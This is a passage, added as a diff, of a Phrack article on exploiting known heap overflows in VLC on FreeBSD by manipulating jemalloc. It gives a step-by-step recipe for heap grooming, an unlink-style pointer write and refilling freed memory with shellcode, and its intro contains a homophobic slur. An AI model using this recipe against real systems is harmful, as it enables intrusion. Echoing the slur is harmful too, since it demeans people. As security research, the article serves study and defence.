@@ -1,0 +1,2263 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x44, Phile #0x0d of 0x13
+
+|=-----------------------------------------------------------------------=|
+|=-------------=[       The Art of Exploitation       ]=-----------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------------=[ Exploiting VLC ]=---------------------------|
+|=------------=[ A case study on jemalloc heap overflows ]=--------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------------=[    huku | argp    ]=------------------------=|
+|=--------------------=[  {huku,argp}@grhack.net  ]=---------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+--[ Table of contents
+
+ 1 - Introduction
+   1.1 - Assumptions
+ 2 - Notes on jemalloc magazines
+   2.1 - Your heap reversed
+   2.2 - Your reversed heap reversed again
+   2.3 - Sum up of jemalloc magazine facts
+ 3 - 'MP4_ReadBox_skcr()' heap overflow vulnerability
+   3.1 - MP4 file format structure
+   3.2 - Vulnerability details
+   3.3 - Old is gold; 'unlink()' style ftw
+   3.4 - Controlling 'p_root' data
+   3.5 - MP4 exploitation sum up
+ 4 - Real Media 'DemuxAudioSipr()' heap overflow vulnerability
+   4.1 - VLC as a transcoder
+   4.2 - RMF? What's that?
+   4.3 - Vulnerability details
+   4.4 - 'p_blocks' all over the place
+   4.5 - RMF summary
+ 5 - Building a reliable exploit
+   5.1 - Overall process
+   5.2 - Detecting 'p_root' address candidates
+ 6 - Demonstration
+ 7 - Limitations
+ 8 - Final words
+ 9 - References
+10 - T3h l337 c0d3z
+
+
+--[ 1 - Introduction
+
+The idiom 'exploitation is an art' has been written in Phrack so many
+times that it has probably ended up sounding cliche. With the emergence
+of ASLR, NX, stack cookies, 'unlink()' protections and so on, exploit
+writers seem to have realized the value of their code and have stopped
+sharing their work with ugly faggots (you know who you are). Just have
+a look at the various mailing lists and exploit archives; even the tons
+of Linux kernel exploits found there are almost trash. Obviously it's not
+the exploit writers that have lost their abilities; it's probably because
+they don't care to share fully weaponized code (that's only a privilege of
+people who pay for [censored] or [censored] lulz). The fact that working
+exploits have stopped being released doesn't necessarily mean that the
+underground has stopped their development. Although there's no way for
+us to know, we believe we would all be amazed if we were to have even a
+glimpse of what the underground has to offer (watch and learn: [1], [2]).
+
+In order to develop the exploit presented in this article, we spent about
+a month of continuous late nights in front of ugly terminals, eating junk
+and taking breaks only to piss and shit (funny times). We managed to
+develop a reliable local exploit for VLC. By 'almost' we mean that it is
+possible to make our code 100% reliable but some work is still required;
+we wish we had more time but Phrack had to be released. More details
+on how to extend our code and bypass the limitations that confine its
+reliability are given at a later section. It would probably be a fun
+pastime for someone to continue from where we left off; it's not that
+hard after all the bullshit we had to face. We hope to show you why
+developing an exploit nowadays requires hard work, dedication and at
+least one memleak ;)
+
+This phile was at first meant to be part of our jemalloc research also
+presented in this Phrack issue. Nevertheless, the Phrack staff honored us
+by asking if we were willing to write a separate text with an in-depth
+analysis of all that voodoo we had to perform. Readers might agree that
+VLC is not the most exotic target one can come up with, but we decided
+not to disclose any 0day vulnerabilities and keep it going with a list
+of already published material, found by carefully looking for advisories
+tagged as 'heap based overflows' (we could have googled for 'potential
+DoS' as well, since it usually means ring0 access ;). Keep in mind that
+we wouldn't like to present a vulnerability that would be trivial to
+exploit. We were looking for a target application with a large codebase;
+VLC and Firefox were our primary candidates. We finally decided to deal
+with the first. The result was a local exploit that does not require
+the user to give any addresses; it can figure out everything by itself.
+
+
+----[ 1.1 - Assumptions
+
+For the shake of writing this article...
+
+1 - We assume that the attacker has local access on a server running VLC.
+The VLC instance must have at least one of its several control interfaces
+enabled (HTTP via --extraintf, RC via --rc-host or --rc-unix), that
+will be used to issue media playback requests to the target and make
+the whole process interactive, that is VLC should be running in 'daemon'
+mode. Most people will probably think that those control interfaces can
+also be used to perform a remote attack; they are right. Although, the
+MP4 vulnerability exploited in this article cannot be used for remote
+exploitation, developing a reliable remote exploit is, indeed, feasible
+and in fact, it's just a matter of modifying the attached code.
+
+  Note: Remote exploitation using MP4 files can be performed by streaming
+  MP4 data to the VLC server. Unfortunately, MP4 streams are handled by
+  libffmpeg while MP4 files by VLC's custom MP4 demuxer. Don't get us
+  wrong, we don't believe that ffmpeg is bug-free; it might be vulnerable
+  to the exact same flaw, we just didn't have the time to investigate
+  it further.
+
+2 - VLC cannot be run as root, so, don't expect uid 0 shells. We will
+only try to stress the fact that some people will go to great lengths
+to have your ass in their plate. Hacking is all about information,
+the more information the easier for you to elevate to root.
+
+3 - We assume our target is a x86 machine running FreeBSD-8.2-RELEASE,
+the exact same version we used during our main jemalloc research.
+
+4 - Last but not least, we assume you have read and understood our
+jemalloc analysis. We don't expect you to be a jemalloc ninja, but
+studying our work the way you do your morning newspaper will not get
+you anywhere either ;)
+
+
+--[ 2 - Notes on jemalloc magazines
+
+----[ 2.1 - Your heap reversed
+
+In our main jemalloc research we discussed the use of 'magazines' as a
+thread contention avoidance mechanism. Briefly, when a process spawns
+multiple threads, a global variable called '__isthreaded' is set to
+true. This variable, which can be accessed via the 'extern' storage
+class specifier by any application, instructs jemalloc to initialize
+thread-local data structures for caching heap allocations. Those
+data structures, the so called 'magazines', are allocated and populated
+in a lazy fashion. In the case of 'malloc()', a threaded application
+will eventually reach the 'if' clause shown below ('MALLOC_MAG' and
+'opt_mag' are enabled by default).
+
+
+#ifdef MALLOC_MAG
+static __thread mag_rack_t *mag_rack;
+#endif
+
+...
+
+static inline void *
+arena_malloc(arena_t *arena, size_t size, bool zero)
+{
+  ...
+
+  if(size <= bin_maxclass) {
+#ifdef MALLOC_MAG
+    if(__isthreaded && opt_mag) {
+      mag_rack_t *rack = mag_rack;
+      if(rack == NULL) {
+        rack = mag_rack_create(arena);
+        if(rack == NULL)
+          return (NULL);
+        mag_rack = rack;
+      }
+      return(mag_rack_alloc(rack, size, zero));
+    }
+    ...
+#endif
+
+  ...
+}
+
+
+The first point of interest is the '__thread' classifier in the
+declaration of 'mag_rack'. This specifier instructs gcc/binutils to
+make use of the, so called, TLS (Thread Local Storage) mechanism. The
+'__thread' declarations are grouped and then act as a prototype for
+the initialization of each thread. Simply put, each thread spawned via
+'pthread_create()' will inherit its own private copy of 'mag_rack'
+initialized to 'NULL' since it's also declared as 'static'. Access to
+thread local memory is transparent to the user; each time 'mag_rack'
+is referenced, the runtime automatically figures out where the thread's
+private memory can be found.
+
+It's now easier to understand how 'arena_malloc()' will act once
+'__isthreaded' and 'opt_mag' are set to true. First the existing
+'magazine rack' pointer is checked; if NULL, 'mag_rack_create()' will
+be called to (a) initialize the 'mag_rack_t' structure and (b) populate
+it with preallocated memory regions for the bin that corresponds to the
+requested size (notice that magazine racks are only used for bin-sized
+allocations; larger ones follow another code path).
+
+Assume a random thread in a random application calls 'malloc(4)'. The
+instruction pointer will soon reach a call to 'mag_rack_alloc(mag_rack,
+4, false);'.
+
+
+static inline void *
+mag_rack_alloc(mag_rack_t *rack, size_t size, bool zero)
+{
+  void *ret;
+  bin_mags_t *bin_mags;
+  mag_t *mag;
+  size_t binind;
+
+  binind = size2bin[size]; /* (1) */
+  ...
+
+  bin_mags = &rack->bin_mags[binind]; /* (2) */
+
+  mag = bin_mags->curmag; /* (3) */
+  if (mag == NULL) {
+    /* Create an initial magazine for this size class. */
+
+    mag = mag_create(choose_arena(), binind);
+
+    bin_mags->curmag = mag;
+    mag_load(mag);
+  }
+
+  ret = mag_alloc(mag);
+  ...
+
+  return (ret);
+}
+
+
+The input size is converted to a bin index (1), for a size of 4,
+'binind' will be set to 0. Each magazine rack has its own set of bins
+which are private to the thread (2). Variable 'mag' is set to point to
+the rack's 'magazine' for this specific bin size (3). A 'magazine' is a
+simple array of void pointers, called 'rounds[]', that holds addresses
+of preallocated memory regions of equal size. Function 'mag_load()' is
+called to initialize it. Here's where things start to get more interesting
+and may influence the exploitation process in a significant way. Skimming
+through 'mag_load()' reveals the following:
+
+
+static void
+mag_load(mag_t *mag)
+{
+  ...
+  arena = choose_arena(); /* (1) */
+  bin = &arena->bins[mag->binind];
+
+  for (i = mag->nrounds; i < max_rounds; i++) {
+    ...
+
+    round = arena_bin_malloc_easy(arena, bin, run); /* (2) */
+    ...
+
+    mag->rounds[i] = round;
+  }
+  ...
+
+  mag->nrounds = i;
+  ...
+}
+
+
+Depending on the build configuration, 'choose_arena()' (1) may statically
+assign a thread to the same arena or dynamically to a different one
+every time it gets called. No matter what the assignment process looks
+like, we can see that at (2), the 'rounds[]' array is populated by a
+normal call to 'arena_bin_malloc_easy()' (or 'arena_bin_malloc_hard()');
+the function that a process would call had it not been threaded. Since
+the heap internals work in a purely deterministic way (for now ignore
+the inherent non-determinism regarding thread scheduling), we can be
+quite sure that the regions whose addresses are stored in 'rounds[]'
+will probably be contiguous. Assuming no holes are found in the heap
+(which is easy to assume since an experienced exploit developer knows
+how to fill them), the regions returned by 'arena_bin_malloc_xxx()'
+will be in increasing memory addresses as shown in the following figure.
+
+
+            Run (PAGE_SIZE) that services 4byte allocations
+                   .-------.-------.-----.-------.
+        0xdeadb000 | reg 1 | reg 2 | ... | reg N |
+                   '-------'-------'-----'-------'
+                       ^       ^      ^
+                       |     .-'      '--.
+                       |     |           |
+                    .-----.-----.-----.-----.
+                    |  0  |  1  | ... |  M  |
+                    '-----'-----'-----'-----'
+                         rounds[] array
+
+
+Once initialization is complete, we return back to 'mag_rack_alloc()'
+that calls 'mag_alloc()' to pick an entry in the 'rounds[]' array to
+give to the user.
+
+
+mag_alloc(mag_t *mag) {
+  if (mag->nrounds == 0)
+    return (NULL);
+
+  mag->nrounds--; /* (1) */
+
+  return (mag->rounds[mag->nrounds]); /* (2) */
+}
+
+
+If this is the first allocation taking place in the thread, 'mag_alloc()'
+will return the last element of the 'rounds[]' array. The 'malloc(4)'
+calls that may follow will be served by the exact same magazine with
+regions in decreasing memory addresses! That is, magazines are populated
+in a 'forward' fashion but consumed in 'backward' one so that if you
+allocate, for example, 3 regions, their memory order will be 321 instead
+of 123 :)
+
+
+----[ 2.2 - Your reversed heap reversed again
+
+As explained in our main jemalloc article, '__isthreaded' is set to true
+after a successful call to 'pthread_create()' (in fact, it is enabled by
+libthr) and remains as such until the end of the program's lifetime, that
+is, joining the threads will not set '__isthreaded' to 0. Consequently,
+once the magazine racks have been initialized, jemalloc will keep using
+them no matter what the number of active threads is.
+
+As explained in the previous section, continuous allocations serviced by
+magazines, may return memory regions in decreasing memory addresses. We
+keep using the word 'may' because this is not always the case. Consider
+the following code snippet which we advise that you read carefully:
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+#include <unistd.h>
+
+extern int __isthreaded;
+void *allocs[10];
+
+void start_allocs(void) {
+  int i;
+  printf("Allocating regions\n");
+  for(i = 0; i < 10; i++) {
+    allocs[i] = malloc(192);
+    printf("%p\n", allocs[i]);
+  }
+  return;
+}
+
+void free_allocs(void) {
+  int i;
+  printf("Freeing the regions\n");
+  for(i = 0; i < 10; i++)
+    free(allocs[i]);
+  return;
+}
+
+void free_allocs_rev(void) {
+  int i;
+  printf("Freeing the regions in reverse order\n");
+  for(i = 10 - 1; i >= 0; i--)
+    free(allocs[i]);
+  return;
+}
+
+void *thread_runner(void *p) {
+  int rev = *(int *)p;
+
+  sleep(1);
+
+  if(rev)
+    free_allocs_rev();
+  else
+    free_allocs();
+
+  start_allocs();
+  return NULL;
+}
+
+int main(int argc, char *argv[]) {
+  pthread_t tid;
+  int rev = 0;
+
+  if(argc > 1)
+    rev = atoi(argv[1]);
+
+  start_allocs();
+  pthread_create(&tid, NULL, thread_runner, (void *)&rev);
+  pthread_join(tid, NULL);
+  return 0;
+}
+
+
+There are three important functions in the code above; 'start_allocs()'
+which allocates 10 memory regions that will be serviced by bin-192,
+'free_allocs()' that frees the aforementioned regions in a 'forward'
+fashion and 'free_allocs_rev()' that will do the same thing but in reverse
+order. The 'allocs[]' array holds pointers to allocated regions. On
+startup, 'main()' will call 'start_allocs()' to populate 'allocs[]'
+and then will fire up a thread that will free those regions. Carefully
+looking at jemalloc's code, reveals that even on deallocation, a new
+magazine rack will be allocated and the regions being freed will be
+eventually inserted in the thread's magazine for that specific size class!
+You can think of that as the memory regions changing ownership; regions
+belonging to the main thread, become property of the new thread started by
+'pthread_create()'.
+
+Once the new thread calls 'start_allocs()', the exact same regions that
+were previously freed will be eventually be returned to the caller. The
+order by which they will be returned, depends on the way they were freed
+in the first place. Let's run our test program above by passing it the
+value 0 in 'argv[1]'; this will ask the thread to free the regions in
+the normal way.
+
+
+[hk@lsd ~]$ ./test 0
+Allocating regions
+0x282070c0
+0x28207180
+0x28207240
+0x28207300
+0x282073c0
+0x28207480
+0x28207540
+0x28207600
+0x282076c0
+0x28207780
+Freeing the regions
+Allocating regions
+0x28207780
+0x282076c0
+0x28207600
+0x28207540
+0x28207480
+0x282073c0
+0x28207300
+0x28207240
+0x28207180
+0x282070c0
+
+
+As you can see, the calls to 'malloc()' performed by the thread, return
+the regions in reverse order; this is very similar to what the previous
+section explained. Now let's free the regions allocated by 'main()'
+by calling 'free_allocs_rev()':
+
+
+[hk@lsd ~]$ ./test 1
+Allocating regions
+0x282070c0
+0x28207180
+0x28207240
+0x28207300
+0x282073c0
+0x28207480
+0x28207540
+0x28207600
+0x282076c0
+0x28207780
+Freeing the regions in reverse order
+Allocating regions
+0x282070c0
+0x28207180
+0x28207240
+0x28207300
+0x282073c0
+0x28207480
+0x28207540
+0x28207600
+0x282076c0
+0x28207780
+
+
+Interestingly, the regions are returned in the same order as they were
+allocated. You can think of that as the 'rounds[]' array in 'mag_load()'
+being reversed; the allocations are freed in the reverse order and
+placed in 'rounds[]' but 'mag_alloc()' gives out regions in reverse
+order too... Reverse + reverse = obverse ;)
+
+So why this is important? Regions of a commonly used size (e.g 64), are
+usually allocated by a program before 'pthread_create()' is called. Once a
+thread is created and '__isthreaded' is set to true, freeing those regions
+may result in some thread becoming their master. Future allocations from
+the thread in question, may return regions in the normal way rather than
+in decreasing memory addresses as shown in the previous section. This
+a very important observation that an exploit coder must keep in mind
+while targeting FreeBSD applications or any program utilizing jemalloc.
+
+In the sections to follow, we will be dealing with two vulnerabilities;
+one in the MP4 demuxer and one in the RMF parser. The first concerns
+4-byte allocations which are not that common. As a result, VLC which
+is a multithreaded application, will by default return such regions in
+decreasing locations. On the contrary, the RMF vulnerability is related
+to 192-byte regions, which, being larger, are more common. Several 192-byte
+allocations may have been created or destroyed before 'pthread_create()'
+is called and thus we cannot guarantee their re-allocation order. It
+is for this purpose that we have to employ more tricks for the latter
+vulnerability.
+
+
+----[ 2.3 - Sum up of jemalloc magazine facts
+
+To sum up:
+
+1 - While in glibc and dlmalloc you were used to seeing new memory
+regions getting allocated in higher addresses, this is not the case with
+jemalloc. If magazines are enabled, continuous allocations may return
+regions in decreasing memory order. It's quite easy for anyone to verify
+by pure observation.
+
+2 - Don't get 1 for granted. Depending on the order the allocations were
+performed, even if thread magazines are enabled, memory regions may end
+up being returned in the normal order. This, for example, can happen when
+memory regions that were allocated before the first thread is spawned,
+are eventually freed by one of the threads.
+
+3 - Always remember that jemalloc does not make use of meta-information
+embedded within the regions themselves. The fact that there are no
+inline metadata bordering the end user allocations sounds like good
+news. It's both a wise design choice and a powerful primitive in the
+attacker's hands.
+
+4 - For i = 0 ... 10 goto 1
+
+
+--[ 3 - 'MP4_ReadBox_skcr()' heap overflow vulnerability
+
+----[ 3.1 - MP4 file format structure
+
+The very first vulnerability we will be analyzing is a heap overflow
+within VLC's MP4 demuxer [4]. As stated earlier, VLC's builtin MP4
+demuxer is only used for local files, as opposed to network streams that
+go through an alternate code path, ending up being handled by libffmpeg
+code. Properly parsing a media file is a very cumbersome task involving
+complex sanity checks. File format parsers and especially those related
+to media files have been the root cause of many vulnerabilities in the
+past (remember all that 'RIAA employing Gobbles to pwn media players' [3]
+bullshit?). We are definitely not experts when it comes to multimedia
+formats; we will only take a look at how an MP4 file is structured, no
+details will be given on signal processing and encoding/decoding stuff,
+since the actual vulnerability is by no means related to the mathematics
+involved in the MP4 specifications (we imagine that there are juicy bugs
+there too ;)
+
+Briefly, an MP4 file looks like a tree of nodes serialized in a depth
+first order with the root node coming first (people that have experience
+with DWARF will probably notice the similarities). Tree nodes are split
+in two categories: containers and leaf nodes, also known as 'boxes',
+with the later holding the media information (both data and metadata) and
+the first playing the role of logically connecting its children. There
+are several types of boxes (frma, skcr, dref, url, urn, etc.) as well as
+several types of containers (ftyp, udta, moov, wave, etc.).
+
+  Easter egg: We believe URLs embedded withing MP4 meta-information,
+  which are normally used to fetch artist names, cover artwork and so on,
+  may also be used for performing web attacks. Let us know if you have
+  experience on this ;) Dear Anonymous, did you know that sharing such
+  media files in P2P networks may be used for more uniformly distributed
+  attacks?
+
+Each tree node, weather a container or a box, is represented by a
+structure called 'MP4_Box_t' defined in modules/demux/mp4/libmp4.h:970:
+
+
+typedef struct MP4_Box_s {
+  off_t i_pos;           /* Offset of node in the file */
+  uint32_t i_type;       /* Node type */
+  ...
+  uint64_t i_size;       /* Size of data including headers etc */
+  MP4_Box_data_t data;   /* A union of pointers; depends on 'i_type' */
+
+  /* Tree related pointers */
+  struct MP4_Box_s *p_father;
+  struct MP4_Box_s *p_first;
+  struct MP4_Box_s *p_last;
+  struct MP4_Box_s *p_next;
+} MP4_Box_t;
+
+
+The vulnerability lies in the function responsible for parsing boxes of
+type 'skcr'.
+
+
+----[ 3.2 - Vulnerability details
+
+For each box type, a dispatch table is used to call the appropriate
+function that handles its contents. For 'skcr' boxes, 'MP4_ReadBox_skcr()'
+is responsible for doing the dirty work.
+
+
+/* modules/demux/mp4/libmp4.c:2248 */
+static int MP4_ReadBox_skcr(..., MP4_Box_t *p_box) {
+  MP4_READBOX_ENTER(MP4_Box_data_frma_t);
+
+  MP4_GET4BYTES(p_box->data.p_skcr->i_init);
+  MP4_GET4BYTES(p_box->data.p_skcr->i_encr);
+  MP4_GET4BYTES(p_box->data.p_skcr->i_decr);
+
+  ...
+}
+
+
+'MP4_READBOX_ENTER()' is a macro that, among other things, will allocate a
+structure of the given type and store it in 'p_box->data.p_data'. Macro
+'MP4_GET4BYTES()' will just read 4 bytes off the input stream and store
+it in the region pointed by the argument. While messing with the VLC
+internals, it's good to keep in mind that integers in MP4 files (as well
+as other media types) are in big endian order.
+
+The vulnerability is kind of obvious; instead of allocating a
+'MP4_Box_data_skcr_t' structure, 'MP4_ReadBox_skcr()' allocates
+an 'MP4_Box_data_frma_t', but later on, the pointer is assumed to
+point to a struct of the first type (notice how 'MP4_GET4BYTES()' is
+used; the 'data' union of the 'MP4_Box_t' is assumed to point to the
+correct structure). 'MP4_Box_data_frma_t', on x86, is 4 bytes long but
+'MP4_ReadBox_skcr()' will treat it as having a size of 12 bytes (the
+real size of 'MP4_Box_data_skcr_t'), resulting in 8 bytes being written
+off the heap region boundaries.
+
+
+----[ 3.3 - Old is gold; 'unlink()' style ftw
+
+The very first thing to note is the size of the victim structure (the
+one being overflown). 'MP4_Box_data_frma_t' has a size of 4 bytes, so,
+it is handled by jemalloc's bin for this specific size class (depending on
+the variant, 4 may or may not be the smallest bin size). As a consequence,
+the 8 bytes written outside its bounds can only influence neighboring
+allocations of equal size, namely 4. Exploit developers know that the
+heap has to be specially prepared before triggering an overflow. For
+this specific vulnerability, the attacker has to force VLC place
+4-byte allocations of interest next to the victim structure. Looking
+carefully in libmp4.h, reveals the following two box types which seem
+to be interesting:
+
+
+typedef struct {
+  char *psz_text;
+} MP4_Box_data_0xa9xxx_t;
+
+...
+
+typedef struct MP4_Box_data_cmov_s {
+  struct MP4_Box_s *p_moov;
+} MP4_Box_data_cmov_t;
+
+
+Obviously, both structures are 4 bytes long and thus good target
+candidates. 'MP4_Box_data_0xa9xxx_t' holds a pointer to a string we
+control, and 'MP4_Box_data_cmov_t' a pointer to some 'MP4_Box_t' whose
+type and contents may be partially influenced by the attacker. Let's focus
+on the 'cmov' box first and why that 'p_moov' pointer is interesting. What
+can we do if we eventually manage to place a 'cmov' box next to the victim
+'frma' structure?
+
+
+/* modules/demux/mp4/libmp4.c:2882 */
+MP4_Box_t *MP4_BoxGetRoot(...) {
+  ...
+
+  /* If parsing is successful... */
+  if(i_result) {
+    MP4_Box_t *p_moov;
+    MP4_Box_t *p_cmov;
+
+    /* Check if there is a cmov... */
+    if(((p_moov = MP4_BoxGet(p_root, "moov")) &&
+        (p_cmov = MP4_BoxGet(p_root, "moov/cmov"))) ||
+       ((p_moov = MP4_BoxGet(p_root, "foov")) &&
+        (p_cmov = MP4_BoxGet(p_root, "foov/cmov")))) {
+
+      ...
+      p_moov = p_cmov->data.p_cmov->p_moov; /* (1) */
+      ...
+      p_moov->p_father = p_root; /* (2) */
+      ...
+    }
+  }
+
+  return p_root;
+}
+
+
+'MP4_BoxGetRoot()' is the entry point of VLC's MP4 file parser. The
+first 'if' block is entered when parsing has finished and everything
+has gone smoothly; only fatal errors are taken into account. Certain
+erroneous conditions are gracefully handled by aborting the parsing
+process of the current tree node and continuing to the parent. The
+second 'if' block looks up the 'cmov' box and, if one is found, VLC
+will store the 'p_cmov->p_moov' in a local variable called 'p_moov'
+(1). If we manage to overwrite the 'cmov' structure, then the value of
+'p_moov' may arbitrarily be set by us. Then, at (2), an 'unlink()' style
+pointer exchange takes place which will allow us to write the 'p_root'
+pointer on a memory region of our choice.
+
+But wait a minute... We control the address that 'p_root' is written
+to, not 'p_root' nor the contents of the memory it points to. We need
+to figure out a way of affecting the data at the location pointed to by
+'p_root'. If we get to do that, then writing 'p_root' in a properly
+selected .got entry may result in code execution.
+
+For now, let's forget about 'p_root' and find a way of overwriting the
+'p_moov' field of a 'cmov' box. First we need to perform several 4-byte
+allocations to stabilize the heap and make sure that the 8 bytes to
+be written to the adjacent regions will not end up in neighboring
+run/chunk metadata. Such a situation may cause a segmentation fault on
+the next call to 'malloc()'; that's something we would definitely like
+to avoid. The tool for performing user controlled allocations is called
+'MP4_ReadBox_0xa9xxx()', the function responsible for parsing boxes of
+type 'MP4_Box_data_0xa9xxx_t'. A careful look at its code reveals that
+we can allocate a string of any size we please; 'AAA\0' is exactly what
+we need right now ;)
+
+Now recall that in certain cases, when the target application is
+threaded and has 'opt_mag' enabled, jemalloc will return memory regions
+in descending memory addresses which is the case with VLC during the
+MP4 parsing process. Extra threads are created and used to pre-process
+the files, download album artwork and so on. What we really need to do
+is force the heap to be shaped as shown below:
+
+
+      ...[SKCR][JUNK][CMOV][AAA\0][AAA\0][AAA\0]...[AAA\0]...
+      -                                                     +
+
+
+'JUNK' stands for a 1-byte allocation caused by a call to 'strdup("")'
+right after 'cmov' is created. The 1-byte allocation ends up being serviced
+by bin-4 since 4 is the minimum allocation granularity for the jemalloc
+variant used in FreeBSD-8.2-RELEASE. The heap layout depicted above is
+pretty straightforward to achieve; the attacker just creates a container
+that holds several '0xa9xxx' boxes followed by 'cmov' and then an 'skcr'
+that will overwrite the 'JUNK' and the 'p_moov' field of the 'cmov'
+neighbor. The multithreading nature of VLC will result in the boxes
+being allocated in reverse order, exactly as shown above.
+
+We have successfully managed to overwrite the 'p_moov' pointer that acts
+as the destination address in the 'unlink()' style pointer exchange. The
+question of how we can control 'p_root' still remains unanswered.
+
+
+----[ 3.4 - Controlling 'p_root' data
+
+Long nights of auditing VLC revealed that there's no easy way for us to
+control the memory contents pointed by 'p_root'. Although we had began
+feeling lost, we came up with a very daring idea that, although dangerous
+at first hearing, we were quite confident that would eventually work
+fine: Why not somehow 'free()' the 'p_root' region? Releasing 'p_root'
+memory and performing several 64-byte (= sizeof(MP4_Box_t)) allocations
+will force jemalloc give 'p_root' back to us. '0xa9xxx' boxes can be
+used to perform user controlled allocations, so, theoretically are ideal
+for what we need. Suppose 'p_root' is freed, then a series of 'a9xxx'
+boxes that contain 64-byte opcodes will result in 'p_root' eventually
+holding our shellcode payload... Right?
+
+Two questions now arise. First, how can one know the address of 'p_root'
+in order to free it? This is a good question, but it's something we will
+be dealing with later. Second, each '0xa9xxx' box results in two 64-byte
+allocations; one for the 'MP4_Box_t' structure to hold the box itself and
+one for the string that will contain our shellcode. How can we guarantee
+that 'p_root' will be given back by jemalloc for the string allocation and
+thus not for the 'MP4_Box_t'? This is where 'chpl' boxes come in handy:
+
+
+/* modules/demux/mp4/libmp4.c:2413 */
+static int MP4_ReadBox_chpl(..., MP4_Box_t *p_box) {
+  MP4_READBOX_ENTER(MP4_Box_data_chpl_t);
+
+  MP4_GET1BYTE( p_chpl->i_chapter );  /* Chapter count; user controlled */
+
+  for(i = 0; i < p_chpl->i_chapter; i++) {
+    ...
+    MP4_GET1BYTE( i_len );  /* Name length; user controlled */
+
+    p_chpl->chapter[i].psz_name = malloc(i_len + 1);
+    ...
+
+    /* 'psz_name' contents; user controlled */
+    memcpy( p_chpl->chapter[i].psz_name, p_peek, i_copy );
+    ...
+  }
+  ...
+}
+
+
+Each 'chpl' box can be used to perform a series of 254 allocations of 64
+bytes thus increasing the possibility that 'p_root' will be returned for
+our data, not for the 'MP4_Box_t' that describes the 'chpl' node (254/255
+versus 1/255; without even taking into account the determinism of heap
+internals).
+
+We have successfully located a gadget that will allow us to control
+'p_root' data but only once the latter has been freed. Now recall that
+'a9xxx' boxes are 4 bytes long and can thus be placed right next to the
+victim 'frma' structure. Don't forget that at this specific time frame
+of the execution, bin sized allocations are always serviced by magazine
+racks and thus decreasing addresses are eventually returned to the user.
+
+
+                ...[SKCR][A9XXX][A9XXX]...
+                -                        +
+
+
+Each call to 'MP4_ReadBox_skcr()' will write 8 bytes off the 'skcr'
+boundaries, so, both of the following 'a9xxx' regions will be overflown
+resulting in their 'psz_text' pointer being overwritten with user
+controlled values. If we could somehow force the 'a9xxx' nodes to be
+freed, their 'psz_text' would be passed to 'free()' as well, resulting
+in the release of two heap regions chosen by the attacker. It turns out
+that doing so is not that hard. All we have to do is place those 'skcr'
+and 'a9xxx' boxes within a common container, which will cause a parsing
+error right after the 'skcr' box is parsed. To do that, we abuse a new
+type of MP4 box called 'stts':
+
+
+/* modules/demux/mp4/libmp4.c:788 */
+static int MP4_ReadBox_stts(..., MP4_Box_t *p_box) {
+
+  MP4_READBOX_ENTER(MP4_Box_data_stts_t);
+  ...
+  MP4_GET4BYTES(p_box->data.p_stts->i_entry_count);
+
+  p_box->data.p_stts->i_sample_count =
+    calloc(p_box->data.p_stts->i_entry_count, sizeof(uint32_t)); /* (1) */
+  ...
+
+  if(p_box->data.p_stts->i_sample_count == NULL ...) {
+    MP4_READBOX_EXIT(0);
+  }
+  ...
+}
+
+
+At (1), 'i_entry_count' is, obviously, user controlled. Forcing it to
+hold a very high value will result in 'calloc()' returning NULL and thus
+'MP4_ReadBox_stts()' returning 0; the value that indicates a parsing
+failure. Adding the corrupted '0xa9xxx' boxes and the 'skcr' victim in
+the same container with an invalid 'stts' box, will result in the first
+being freed when the parsing error is detected and thus the attacker
+chosen heap regions to be freed*. VLC will continue reading the rest of
+the MP4 data as if nothing wrong has happened.
+
+  Note: It's crucial to understand that we shouldn't trigger a fatal
+  parsing error at this point since the unlink-like code will never be
+  reached. In fact, the process of doing that is slightly more complicated
+  than described in the previous paragraph; it's a minor detail that should
+  not be taken into account right now.
+
+
+----[ 3.5 MP4 exploitation sum up
+
+To sum up, for this first part of the exploitation process the attacker
+must perform the following steps:
+
+
+1 - Overwrite 'p_moov'
+
+  1a - Allocate several 'a9xxx' boxes that will stabilize the heap
+
+  1b - Allocate a 'cmov' box
+
+  1c - Allocate and fill an 'skcr' box. The 'skcr' handling code will
+  allocate an 'frma' structure (4 bytes) and write 12 bytes in its region
+  thus eventually overwriting 'cmov->p_moov'
+
+2 - Free and control 'p_root' contents
+
+  2a - Create a 'cmov' container
+
+  2b - Fill it with 2 '0xa9xxx' boxes
+
+  2c - Add an 'skcr' that will overwrite the adjacent '0xa9xxx' boxes. The
+  overwritten values should be the address of 'p_root' and a random 64
+  byte allocation in this specific order.
+
+  2d - Add an invalid 'stts' box that will force the parsing process
+  to fail, the 'cmov' and its children (two '0xa9xxx' and one 'skcr')
+  to be freed, the 'psz_text' members of 'MP4_Box_data_0xa9xxx_t' to be
+  passed to 'free()' and consequently, 'p_root' to be released.
+
+  2e - Add several 'chpl' boxes. Each one will result in 254 64byte
+  allocations with user controlled contents. Pray that jemalloc will give
+  'p_root' back to you (most likely).
+
+3 - Repeat step 2 as many times as you please to free as many pointers
+as you like (more on this later)
+
+4 - Properly pack everything together so that the 'unlink()' code
+is reached.
+
+
+One problem still remains; How can one know the address of 'p_root' in
+order to pass it to 'free()'? This is were an information leak would
+be useful. We need to find a bug that when properly exploited will
+reveal data of selected memory regions. Additionally, we need to seek
+the mechanisms by which this data will be returned to the attacker. The
+next section of this phile focuses on these two problems and the voodoo
+required to solve them.
+
+
+--[ 4 - Real Media 'DemuxAudioSipr()' heap overflow vulnerability
+
+----[ 4.1 - VLC as a transcoder
+
+Apart from a full blown media player, VLC can also work as a
+transcoder. Transcoding is the process of receiving numerous inputs,
+applying certain transformations on the input data and then sending the
+result to a set of outputs. This is, for example, what happens when you
+rip a DVD and convert it to an .avi stored on your hard disk. In its most
+simple use, transcoding may be used to duplicate an input stream to both
+your soundcard as well as an alternate output, for example, an RTP/HTTP
+network stream, so that other users can listen to the music you're
+currently listening; a mechanism invaluable for your favorite pr0n. For
+more information and some neat examples of using VLC in more advanced
+scenarios, you can have a look at the VideoLan wiki and especially at [5].
+
+Trying to find a way to leak memory from VLC, we carefully studied several
+examples from the wiki page at [5] and then started feeding VLC with a
+bunch of mysterious options; we even discovered a FreeBSD kernel 0day while
+doing so. After messing with the command line arguments for a couple of
+minutes we settled down to the following:
+
+
+vlc ass_traffic.mp4 :sout='#std{access=file,mux=raw,dst=dup.mp4}'
+
+
+This command, which is just a primitive usage of VLC's transcoding
